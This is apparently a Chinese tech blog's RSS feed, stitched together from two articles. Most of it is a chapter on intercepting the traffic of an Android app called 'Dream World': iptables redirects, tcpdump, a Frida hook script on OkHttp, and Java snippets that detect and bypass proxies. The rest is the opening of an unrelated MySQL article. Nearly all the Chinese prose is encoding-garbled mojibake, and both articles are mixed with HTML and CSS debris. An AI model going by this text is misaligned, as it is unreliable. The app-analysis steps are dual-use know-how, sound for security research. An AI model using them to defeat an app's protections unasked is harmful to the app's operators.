</span></code></pre>
<p><strong>æµ‹è¯•ç»“æœ</strong>ï¼š</p>
<p>å®‰è£…HttpCanaryï¼Œå¯åŠ¨VPNï¼Œç„¶åæ‰“å¼€"æ¢¦æƒ³ä¸–ç•Œ"APPã€‚</p>
<p><strong>ä¾ç„¶æŠ“ä¸åˆ°ä»»ä½•æ•°æ®ã€‚</strong></p>
<p>APPæ­£å¸¸è¿è¡Œï¼Œä½†HttpCanaryä¸­æ²¡æœ‰ä»»ä½•æ¥è‡ª"æ¢¦æƒ³ä¸–ç•Œ"çš„è¯·æ±‚è®°å½•ã€‚</p>
<h4 data-id="heading-16">1.4.2 iptablesæµé‡è½¬å‘</h4>
<p>åœ¨Rootè®¾å¤‡ä¸Šï¼Œæˆ‘å°è¯•ä½¿ç”¨iptableså¼ºåˆ¶è½¬å‘æ‰€æœ‰æµé‡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°†æ‰€æœ‰443ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°ä»£ç†</span>
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8888

<span class="hljs-comment"># å°†æ‰€æœ‰80ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°ä»£ç†</span>
iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8888
</code></pre>
<p><strong>æµ‹è¯•ç»“æœ</strong>ï¼š</p>
<p><strong>è¿˜æ˜¯æŠ“ä¸åˆ°ã€‚</strong></p>
<p>APPä¼¼ä¹ä½¿ç”¨äº†éæ ‡å‡†ç«¯å£ï¼Œæˆ–è€…æœ‰å…¶ä»–æ–¹å¼ç»‘è¿‡iptablesè§„åˆ™ã€‚</p>
<h4 data-id="heading-17">1.4.3 WiresharkæŠ“åŒ…</h4>
<p>ä½œä¸ºæœ€åçš„å°è¯•ï¼Œæˆ‘ä½¿ç”¨Wiresharkåœ¨è·¯ç”±å™¨å±‚é¢æŠ“åŒ…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨è·¯ç”±å™¨ä¸Šè¿è¡Œtcpdump</span>
tcpdump -i eth0 host æ‰‹æœºIP -w capture.pcap
</code></pre>
<p><strong>æµ‹è¯•ç»“æœ</strong>ï¼š</p>
<p>ç»ˆäºæŠ“åˆ°äº†ä¸€äº›æ•°æ®ï¼ä½†æ˜¯ï¼š</p>
<ul>
<li>æ‰€æœ‰æ•°æ®éƒ½æ˜¯åŠ å¯†çš„ï¼ˆTLS 1.3ï¼‰</li>
<li>æ— æ³•çœ‹åˆ°HTTPè¯·æ±‚çš„å…·ä½“å†…å®¹</li>
<li>åªèƒ½çœ‹åˆ°è¿æ¥çš„ç›®æ ‡IPå’Œç«¯å£</li>
</ul>
<p>è¿™è¯å®äº†APPç¡®å®åœ¨è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œåªæ˜¯æˆ‘ä»¬æ— æ³•é€šè¿‡å¸¸è§„æ‰‹æ®µçœ‹åˆ°é€šä¿¡å†…å®¹ã€‚</p>
<hr/>
<h3 data-id="heading-18">1.5 é˜¶æ®µæ€§æ€»ç»“</h3>
<p>ç»è¿‡ä¸€ä¸ªæ™šä¸Šçš„å°è¯•ï¼Œæˆ‘å¯¹è¿™æ¬¾APPçš„ç½‘ç»œé˜²æŠ¤æœ‰äº†åˆæ­¥äº†è§£ï¼š</p>
<h4 data-id="heading-19">1.5.1 é˜²æŠ¤ç‰¹ç‚¹</h4>

























<table><thead><tr><th>ç‰¹ç‚¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç²¾å‡†æ£€æµ‹</strong></td><td>åªæ£€æµ‹HTTPä»£ç†ï¼Œä¸å½±å“SOCKSä»£ç†</td></tr><tr><td><strong>é™é»˜å¤„ç†</strong></td><td>æ£€æµ‹åˆ°ä»£ç†åä¸å´©æºƒï¼Œè€Œæ˜¯åˆ‡æ¢é€šä¿¡æ–¹å¼</td></tr><tr><td><strong>ç”¨æˆ·å‹å¥½</strong></td><td>æ™®é€šç”¨æˆ·å®Œå…¨æ„ŸçŸ¥ä¸åˆ°å¼‚å¸¸</td></tr><tr><td><strong>å¤šå±‚é˜²æŠ¤</strong></td><td>HTTPä»£ç†ã€VPNã€iptableséƒ½æ— æ³•çªç ´</td></tr></tbody></table>
<h4 data-id="heading-20">1.5.2 æŠ€æœ¯æ¨æµ‹</h4>
<p>åŸºäºè§‚å¯Ÿåˆ°çš„ç°è±¡ï¼Œæˆ‘æ¨æµ‹APPå¯èƒ½ä½¿ç”¨äº†ä»¥ä¸‹æŠ€æœ¯ï¼š</p>
<ol>
<li><strong>ä»£ç†æ£€æµ‹</strong>ï¼šåœ¨åº”ç”¨å¯åŠ¨æ—¶æ£€æµ‹ç³»ç»Ÿä»£ç†è®¾ç½®</li>
<li><strong>é€šä¿¡åˆ‡æ¢</strong>ï¼šæ£€æµ‹åˆ°ä»£ç†åï¼Œåˆ‡æ¢åˆ°ç›´è¿æ¨¡å¼</li>
<li><strong>è‡ªå®šä¹‰ç½‘ç»œæ ˆ</strong>ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„Socketå®ç°ï¼Œç»•è¿‡ç³»ç»Ÿç½‘ç»œå±‚</li>
<li><strong>éæ ‡å‡†ç«¯å£</strong>ï¼šå¯èƒ½ä½¿ç”¨é80/443çš„ç«¯å£è¿›è¡Œé€šä¿¡</li>
</ol>
<h4 data-id="heading-21">1.5.3 ä¸‹ä¸€æ­¥è®¡åˆ’</h4>
<p>æ—¢ç„¶ç½‘ç»œå±‚çš„æŠ“åŒ…è¡Œä¸é€šï¼Œæˆ‘éœ€è¦æ¢ä¸€ä¸ªæ€è·¯ï¼š</p>
<ol>
<li><strong>é™æ€åˆ†æ</strong>ï¼šåç¼–è¯‘APKï¼Œåˆ†æä»£ç é€»è¾‘</li>
<li><strong>åŠ¨æ€è°ƒè¯•</strong>ï¼šä½¿ç”¨Fridaç­‰å·¥å…·Hookç½‘ç»œè¯·æ±‚</li>
<li><strong>æ¨¡æ‹Ÿæ‰§è¡Œ</strong>ï¼šå¦‚æœåŠ¨æ€è°ƒè¯•ä¹Ÿè¢«é˜»æ­¢ï¼Œè€ƒè™‘ä½¿ç”¨Unidbg</li>
</ol>
<hr/>
<h3 data-id="heading-22">1.6 æ„å¤–å‘ç°ï¼šFridaçš„å‘½è¿</h3>
<p>åœ¨ç»“æŸè¿™ä¸ªæ™šä¸Šçš„å·¥ä½œä¹‹å‰ï¼Œæˆ‘å†³å®šå¿«é€Ÿå°è¯•ä¸€ä¸‹Fridaã€‚</p>
<p>Fridaæ˜¯ä¸€æ¬¾å¼ºå¤§çš„åŠ¨æ€æ’æ¡©å·¥å…·ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶æ³¨å…¥ä»£ç åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ã€‚å¦‚æœèƒ½ç”¨Frida Hookä½ç½‘ç»œè¯·æ±‚ç›¸å…³çš„å‡½æ•°ï¼Œå°±èƒ½çœ‹åˆ°APPå‘é€çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-23">1.6.1 å‡†å¤‡Fridaç¯å¢ƒ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…Frida</span>
pip install frida-tools

<span class="hljs-comment"># åœ¨æ‰‹æœºä¸Šå¯åŠ¨frida-server</span>
adb push frida-server /data/local/tmp/
adb shell <span class="hljs-built_in">chmod</span> +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &amp;
</code></pre>
<h4 data-id="heading-24">1.6.2 ç¼–å†™Hookè„šæœ¬</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// hook_network.js</span>
<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Starting network hook..."</span>);
    
    <span class="hljs-comment">// Hook OkHttpçš„è¯·æ±‚æ–¹æ³•</span>
    <span class="hljs-keyword">var</span> <span class="hljs-title class_">OkHttpClient</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">'okhttp3.OkHttpClient'</span>);
    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Request</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">'okhttp3.Request'</span>);
    
    <span class="hljs-title class_">OkHttpClient</span>.<span class="hljs-property">newCall</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">request</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] ========== New Request =========="</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] URL: "</span> + request.<span class="hljs-title function_">url</span>().<span class="hljs-title function_">toString</span>());
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Method: "</span> + request.<span class="hljs-title function_">method</span>());
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Headers: "</span> + request.<span class="hljs-title function_">headers</span>().<span class="hljs-title function_">toString</span>());
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">newCall</span>(request);
    };
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Hook installed!"</span>);
});
</code></pre>
<h4 data-id="heading-25">1.6.3 è¿è¡ŒFrida</h4>
<pre><code class="hljs language-bash" lang="bash">frida -U -f com.dreamworld.app -l hook_network.js --no-pause
</code></pre>
<p><strong>ç»“æœ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">     ____
    / _  |   Frida 16.1.4 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       <span class="hljs-built_in">help</span>      -&gt; Displays the <span class="hljs-built_in">help</span> system
   . . . .       object?   -&gt; Display information about <span class="hljs-string">'object'</span>
   . . . .       <span class="hljs-built_in">exit</span>/quit -&gt; Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Pixel 6 Pro (<span class="hljs-built_in">id</span>=192.168.1.101:5555)
Spawning `com.dreamworld.app`...
Process crashed: Segmentation fault
</code></pre>
<p><strong>APPç›´æ¥å´©æºƒäº†ï¼</strong></p>
<p>Fridaæ³¨å…¥åï¼ŒAPPç«‹å³å‘ç”Ÿæ®µé”™è¯¯ï¼ˆSegmentation faultï¼‰å¹¶é€€å‡ºã€‚</p>
<p>è¿™è¯´æ˜APPå®ç°äº†<strong>åFridaæ£€æµ‹æœºåˆ¶</strong>ã€‚ä¸€æ—¦æ£€æµ‹åˆ°Fridaçš„å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘å´©æºƒï¼Œé˜»æ­¢ä»»ä½•åŠ¨æ€è°ƒè¯•ã€‚</p>
<h4 data-id="heading-26">1.6.4 è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</h4>
<p>è¿™æ¬¾APPçš„å®‰å…¨é˜²æŠ¤ä¸ä»…ä»…æ˜¯ç½‘ç»œå±‚çš„ï¼š</p>

























<table><thead><tr><th>é˜²æŠ¤å±‚</th><th>é˜²æŠ¤æªæ–½</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>ç½‘ç»œå±‚</td><td>ä»£ç†æ£€æµ‹ + é€šä¿¡åˆ‡æ¢</td><td>æŠ“åŒ…å·¥å…·å¤±æ•ˆ</td></tr><tr><td>è¿è¡Œæ—¶</td><td>Fridaæ£€æµ‹</td><td>åŠ¨æ€è°ƒè¯•å¤±è´¥</td></tr><tr><td>???</td><td>???</td><td>å¾…å‘ç°</td></tr></tbody></table>
<p>çœ‹æ¥ï¼Œè¿™å°†æ˜¯ä¸€åœºæŒä¹…æˆ˜ã€‚</p>
<hr/>
<h3 data-id="heading-27">1.7 æœ¬ç« å°ç»“</h3>
<h4 data-id="heading-28">1.7.1 å…³é”®å‘ç°</h4>
<ol>
<li><strong>æŠ“åŒ…å®Œå…¨å¤±æ•ˆ</strong>ï¼šCharlesã€HttpCanaryã€iptableséƒ½æ— æ³•æ•è·APPçš„ç½‘ç»œè¯·æ±‚</li>
<li><strong>ç²¾å‡†ä»£ç†æ£€æµ‹</strong>ï¼šAPPåªæ£€æµ‹HTTPä»£ç†ï¼ŒSOCKSä»£ç†å¯ä»¥æ­£å¸¸ä½¿ç”¨</li>
<li><strong>é™é»˜é€šä¿¡åˆ‡æ¢</strong>ï¼šæ£€æµ‹åˆ°ä»£ç†åä¸å´©æºƒï¼Œè€Œæ˜¯åˆ‡æ¢åˆ°ç›´è¿æ¨¡å¼</li>
<li><strong>Fridaè¢«æ£€æµ‹</strong>ï¼šåŠ¨æ€è°ƒè¯•å·¥å…·æ³¨å…¥åAPPç›´æ¥å´©æºƒ</li>
</ol>
<h4 data-id="heading-29">1.7.2 æŠ€æœ¯å¯ç¤º</h4>
<p>è¿™æ¬¾APPå±•ç¤ºäº†ç°ä»£ç§»åŠ¨åº”ç”¨å®‰å…¨é˜²æŠ¤çš„ä¸€ä¸ªé‡è¦è¶‹åŠ¿ï¼š<strong>ç²¾å‡†æ‰“å‡» + ç”¨æˆ·å‹å¥½</strong>ã€‚</p>
<ul>
<li><strong>ç²¾å‡†æ‰“å‡»</strong>ï¼šåªé’ˆå¯¹å®‰å…¨ç ”ç©¶å‘˜çš„å·¥å…·ï¼ˆHTTPä»£ç†ã€Fridaï¼‰ï¼Œä¸å½±å“æ™®é€šç”¨æˆ·</li>
<li><strong>ç”¨æˆ·å‹å¥½</strong>ï¼šæ£€æµ‹åˆ°å¨èƒåä¸æ˜¯ç®€å•å´©æºƒï¼Œè€Œæ˜¯é™é»˜å¤„ç†ï¼Œä¿è¯ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p>è¿™ç§è®¾è®¡æ€è·¯å€¼å¾—æ‰€æœ‰ç§»åŠ¨å¼€å‘è€…å­¦ä¹ ã€‚</p>
<h4 data-id="heading-30">1.7.3 ä¸‹ä¸€æ­¥</h4>
<p>æ—¢ç„¶ç½‘ç»œæŠ“åŒ…å’ŒåŠ¨æ€è°ƒè¯•éƒ½è¡Œä¸é€šï¼Œæˆ‘éœ€è¦ï¼š</p>
<ol>
<li><strong>é™æ€åˆ†æ</strong>ï¼šåç¼–è¯‘APKï¼Œä»ä»£ç å±‚é¢ç†è§£APPçš„å·¥ä½œåŸç†</li>
<li><strong>å¯»æ‰¾çªç ´å£</strong>ï¼šåˆ†æä»£ç†æ£€æµ‹å’ŒFridaæ£€æµ‹çš„å…·ä½“å®ç°</li>
<li><strong>æ¢ç´¢æ–°å·¥å…·</strong>ï¼šè€ƒè™‘ä½¿ç”¨Unidbgç­‰ç¦»çº¿æ¨¡æ‹Ÿæ‰§è¡Œå·¥å…·</li>
</ol>
<hr/>
<h3 data-id="heading-31">æœ¬ç« æ€è€ƒé¢˜</h3>
<ol>
<li>
<p>ä¸ºä»€ä¹ˆAPPé€‰æ‹©"é™é»˜åˆ‡æ¢é€šä¿¡æ–¹å¼"è€Œä¸æ˜¯"ç›´æ¥å´©æºƒ"ï¼Ÿè¿™ç§è®¾è®¡æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</p>
</li>
<li>
<p>å¦‚æœä½ æ˜¯è¿™æ¬¾APPçš„å®‰å…¨å·¥ç¨‹å¸ˆï¼Œä½ ä¼šå¦‚ä½•æ”¹è¿›ç°æœ‰çš„ä»£ç†æ£€æµ‹æœºåˆ¶ï¼Ÿ</p>
</li>
<li>
<p>é™¤äº†HTTPä»£ç†æ£€æµ‹ï¼Œè¿˜æœ‰å“ªäº›æ–¹æ³•å¯ä»¥é˜»æ­¢æŠ“åŒ…åˆ†æï¼Ÿ</p>
</li>
</ol>
<h3 data-id="heading-32">ç« èŠ‚é™„å½•</h3>
<h4 data-id="heading-33">A. æœ¬ç« æ¶‰åŠçš„å·¥å…·</h4>






























<table><thead><tr><th>å·¥å…·</th><th>ç”¨é€”</th><th>å®˜ç½‘</th></tr></thead><tbody><tr><td>Charles Proxy</td><td>HTTP/HTTPSæŠ“åŒ…</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.charlesproxy.com%2F" target="_blank" title="https://www.charlesproxy.com/" ref="nofollow noopener noreferrer">www.charlesproxy.com/</a></td></tr><tr><td>HttpCanary</td><td>Android VPNæŠ“åŒ…</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fhttpcanary.com%2F" target="_blank" title="https://httpcanary.com/" ref="nofollow noopener noreferrer">httpcanary.com/</a></td></tr><tr><td>Frida</td><td>åŠ¨æ€æ’æ¡©</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Ffrida.re%2F" target="_blank" title="https://frida.re/" ref="nofollow noopener noreferrer">frida.re/</a></td></tr><tr><td>Wireshark</td><td>ç½‘ç»œåè®®åˆ†æ</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wireshark.org%2F" target="_blank" title="https://www.wireshark.org/" ref="nofollow noopener noreferrer">www.wireshark.org/</a></td></tr></tbody></table>
<h4 data-id="heading-34">B. æœ¬ç« å…³é”®ä»£ç </h4>
<p><strong>ä»£ç†æ£€æµ‹ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProxySet</span><span class="hljs-params">()</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">proxyHost</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">"http.proxyHost"</span>);
    <span class="hljs-keyword">return</span> proxyHost != <span class="hljs-literal">null</span> &amp;&amp; !proxyHost.isEmpty();
}
</code></pre>
<p><strong>ç»•è¿‡ä»£ç†ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
    .proxy(Proxy.NO_PROXY)
    .build();
</code></pre>
<h4 data-id="heading-35">C. å‚è€ƒèµ„æ–™</h4>
<ol>
<li>Android Proxy Settings: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fnet%2FProxyInfo" target="_blank" title="https://developer.android.com/reference/android/net/ProxyInfo" ref="nofollow noopener noreferrer">developer.android.com/reference/aâ€¦</a></li>
<li>OkHttp Proxy Configuration: <a href="https://link.juejin.cn?target=https%3A%2F%2Fsquare.github.io%2Fokhttp%2F" target="_blank" title="https://square.github.io/okhttp/" ref="nofollow noopener noreferrer">square.github.io/okhttp/</a></li>
<li>Frida Documentation: <a href="https://link.juejin.cn?target=https%3A%2F%2Ffrida.re%2Fdocs%2F" target="_blank" title="https://frida.re/docs/" ref="nofollow noopener noreferrer">frida.re/docs/</a></li>
</ol>
<hr/>
<p><em>æœ¬ç« å®Œ</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQLæ–‡æœ¬å¤„ç†ï¼šå…¨åº“æœç´¢æ…¢ï¼Ÿæ­£åˆ™æ¸…æ´—éš¾ï¼ŸæŒæ¡è¿™ 3 ä¸ªæ–¹æ³•]]></title>    <link>https://juejin.cn/post/7592622563547496483</link>    <guid>https://juejin.cn/post/7592622563547496483</guid>    <pubDate>2026-01-08T20:04:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592622563547496483" data-draft-id="7592819937652670479" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQLæ–‡æœ¬å¤„ç†ï¼šå…¨åº“æœç´¢æ…¢ï¼Ÿæ­£åˆ™æ¸…æ´—éš¾ï¼ŸæŒæ¡è¿™ 3 ä¸ªæ–¹æ³•"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T20:04:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ•°æ®å°é¦’å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/48851852475720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQLæ–‡æœ¬å¤„ç†ï¼šå…¨åº“æœç´¢æ…¢ï¼Ÿæ­£åˆ™æ¸…æ´—éš¾ï¼ŸæŒæ¡è¿™ 3 ä¸ªæ–¹æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/48851852475720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ•°æ®å°é¦’å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T20:04:16.000Z" title="Thu Jan 08 2026 20:04:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ•°æ®åº“å¼€å‘ä¸­ï¼Œæˆ‘ä»¬æœ€ä¸æ„¿æ„é¢å¯¹çš„å¾€å¾€ä¸æ˜¯å¤æ‚çš„ Joinï¼Œè€Œæ˜¯â€œæ–‡æœ¬å¤„ç†â€ã€‚</p>
<ul>
<li><strong>æ¨¡ç³Šæœç´¢ï¼š</strong> ä¸šåŠ¡æ–¹è¦æ±‚â€œæœç´¢åŒ…å«â€˜è‹¹æœâ€™çš„æ‰€æœ‰å•†å“â€ï¼Œå¼€å‘äººå‘˜åæ‰‹ä¸€ä¸ª LIKE '%è‹¹æœ%'ï¼Œå¯¼è‡´å…¨è¡¨æ‰«æï¼Œæ•°æ®åº“ CPU é£™å‡ã€‚</li>
<li><strong>æ•°æ®æ¸…æ´—ï¼š</strong> å†å²æ•°æ®é‡Œæ··å…¥äº†éæ³•çš„æ‰‹æœºå·æ ¼å¼ï¼Œéœ€è¦æ¸…æ´—ï¼Œåªèƒ½å†™ Python è„šæœ¬æŠŠå‡ ç™¾ä¸‡æ¡æ•°æ®æ‹‰å‡ºæ¥è·‘æ­£åˆ™ã€‚</li>
<li><strong>å¤šè¡Œåˆå¹¶ï¼š</strong> å‰ç«¯è¦æ±‚æŠŠâ€œç”¨æˆ·æ‹¥æœ‰çš„æ‰€æœ‰æ ‡ç­¾â€åˆå¹¶æˆä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²è¿”å›ï¼Œåç«¯åªèƒ½åœ¨å†…å­˜é‡Œæ‹¼æ¥ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e74639a8ba64780b1013728cb2c313d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507455&amp;x-signature=JzXF85aNWc7U9qmGgUPUKJfNW8I%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€ æ‹’ç»å…¨è¡¨æ‰«æï¼šLIKE çš„æ›¿ä»£è€…â€”â€”å…¨æ–‡ç´¢å¼• (Full-Text)</h2>
<p>åœºæ™¯å¤ç°ï¼š</p>
